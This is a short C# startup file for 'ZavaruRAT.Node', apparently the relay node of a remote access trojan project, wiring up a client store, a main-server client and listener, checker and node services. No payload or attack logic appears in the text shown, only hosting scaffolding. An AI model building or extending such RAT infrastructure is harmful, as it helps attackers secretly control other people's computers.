#region

using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using ZavaruRAT.Node;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Node.Services;

#endregion

var host = Host.CreateDefaultBuilder(Environment.GetCommandLineArgs());

host.ConfigureServices((app, services) =>
{
    services
        .AddSingleton<ZavaruClientsStorage>()
        .AddMainServerClient();

    services
        .AddHostedService<ZavaruListenerService>()
        .AddHostedService<ZavaruCheckerService>()
        .AddHostedService<ZavaruNodeService>();
});

await host.RunConsoleAsync();
